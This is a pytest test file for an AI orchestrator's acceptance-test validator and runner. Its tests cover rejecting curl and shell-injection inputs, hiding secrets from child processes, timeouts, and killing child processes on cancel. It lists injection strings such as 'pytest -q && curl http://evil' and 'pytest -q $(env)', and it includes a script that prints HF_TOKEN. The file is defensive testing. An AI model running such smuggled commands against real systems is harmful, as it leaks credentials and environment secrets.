from __future__ import annotations

import asyncio
from pathlib import Path
from unittest.mock import patch

import pytest
from tests.helpers.child_processes import write_grandchild_spawner
from tests.helpers.ticket_fixtures import greeter_task_plan

from sprint_crew.orchestrator.acceptance_tests import (
    AcceptanceTestsValidationError,
    run_acceptance_tests,
    validate_acceptance_tests,
)
from sprint_crew.proc import ProcResult


def test_validate_acceptance_tests_accepts_pytest_q() -> None:
    assert validate_acceptance_tests(["pytest -q"]) == ["pytest -q"]


def test_validate_acceptance_tests_accepts_pytest_k_passes() -> None:
    assert validate_acceptance_tests(["pytest -k passes"]) == ["pytest -k passes"]


def test_validate_acceptance_tests_rejects_prose_suffix() -> None:
    with pytest.raises(AcceptanceTestsValidationError) as exc:
        validate_acceptance_tests(["pytest -q passes"])
    assert "pytest -q passes" in exc.value.invalid


def test_validate_acceptance_tests_rejects_curl() -> None:
    with pytest.raises(AcceptanceTestsValidationError):
        validate_acceptance_tests(["curl http://localhost"])


def test_validate_acceptance_tests_rejects_empty() -> None:
    with pytest.raises(AcceptanceTestsValidationError):
        validate_acceptance_tests([])


@pytest.mark.asyncio
async def test_run_acceptance_tests_green_on_fixture(tmp_workspace) -> None:
    plan = greeter_task_plan()
    (tmp_workspace / "greeter.py").write_text(
        'def hello():\n    return "hello"\n',
        encoding="utf-8",
    )
    output, passed = await run_acceptance_tests(tmp_workspace, plan.acceptance_tests)
    assert passed is True
    assert "exit_code=0" in output


@pytest.mark.asyncio
async def test_run_acceptance_tests_red_when_tests_fail(tmp_workspace) -> None:
    plan = greeter_task_plan()
    (tmp_workspace / "greeter.py").write_text("# empty\n", encoding="utf-8")
    output, passed = await run_acceptance_tests(tmp_workspace, plan.acceptance_tests)
    assert passed is False
    assert "exit_code=" in output


@pytest.mark.parametrize(
    "command",
    [
        "pytest -q; env",
        "pytest -q && curl http://evil",
        "pytest -q | tee /tmp/out",
        "pytest -q $(env)",
    ],
)
def test_validate_acceptance_tests_rejects_shell_injection(command: str) -> None:
    """argv[0] is `pytest` in all four, so an argv[0]-only allowlist accepted them and the
    runner then handed the original string to a shell."""
    with pytest.raises(AcceptanceTestsValidationError):
        validate_acceptance_tests([command])


@pytest.mark.asyncio
async def test_run_acceptance_tests_refuses_shell_injection(tmp_path: Path) -> None:
    """The runner revalidates: a caller that skipped the plan-time gate still fails closed."""
    with pytest.raises(AcceptanceTestsValidationError):
        await run_acceptance_tests(tmp_path, ["pytest -q; env"])


@pytest.mark.asyncio
async def test_acceptance_child_does_not_see_secrets(
    tmp_workspace, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Acceptance commands are model-authored; the orchestrator env holds real tokens."""
    monkeypatch.setenv("HF_TOKEN", "hf-secret")
    script = tmp_workspace / "leak.py"
    script.write_text("import os\nprint(os.environ.get('HF_TOKEN'))\n", encoding="utf-8")

    output, _passed = await run_acceptance_tests(tmp_workspace, [f"python {script}"])

    assert "hf-secret" not in output
    assert "None" in output


@pytest.mark.asyncio
async def test_run_acceptance_tests_marks_timeout_as_failure(tmp_path: Path) -> None:
    # A hung acceptance command must count as a failed test, not crash the run.
    async def _timed_out(*args: object, **kwargs: object) -> ProcResult:
        return ProcResult(stdout="", stderr="", returncode=-1, timed_out=True)

    with patch("sprint_crew.orchestrator.acceptance_tests.run_argv", new=_timed_out):
        output, passed = await run_acceptance_tests(tmp_path, ["pytest -q"])
    assert passed is False
    assert "timed out" in output


@pytest.mark.asyncio
async def test_unstartable_command_is_a_failed_test_not_a_crash(tmp_path: Path) -> None:
    """A shell reported a missing interpreter as exit 127; exec raises FileNotFoundError."""

    async def _missing(*args: object, **kwargs: object) -> ProcResult:
        raise FileNotFoundError("no such file: uv")

    with patch("sprint_crew.orchestrator.acceptance_tests.run_argv", new=_missing):
        output, passed = await run_acceptance_tests(tmp_path, ["uv run pytest"])
    assert passed is False
    assert "could not start command" in output


@pytest.mark.asyncio
async def test_cancelling_acceptance_tests_kills_the_child(tmp_path: Path) -> None:
    """The bug this guards: asyncio.to_thread(subprocess.run) is not cancellable — the
    coroutine unwinds but the child runs to completion, so a pytest kept burning CPU for
    up to ACCEPTANCE_TEST_TIMEOUT_S after the user pressed Stop, possibly alongside the
    next run admitted into the single slot.

    The command spawns a *grandchild* that writes the marker, which is what pins the
    process-group kill: signalling only the direct pid would leave the grandchild running
    and the marker would still appear. (It used to rely on a shell for that; acceptance
    commands no longer get one, so the fan-out is done in Python instead.)
    """
    marker = tmp_path / "child-survived"

    child_lifetime = 2.0
    script = write_grandchild_spawner(tmp_path / "spawn.py", lifetime_s=child_lifetime)

    task = asyncio.create_task(run_acceptance_tests(tmp_path, [f"python {script} {marker}"]))
    await asyncio.sleep(0.4)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task

    # Must outlast the child, or the assertion is vacuous: an orphan that has not yet
    # reached its `touch` looks identical to one that was killed.
    await asyncio.sleep(child_lifetime)
    assert not marker.exists(), "acceptance child outlived the cancelled run"
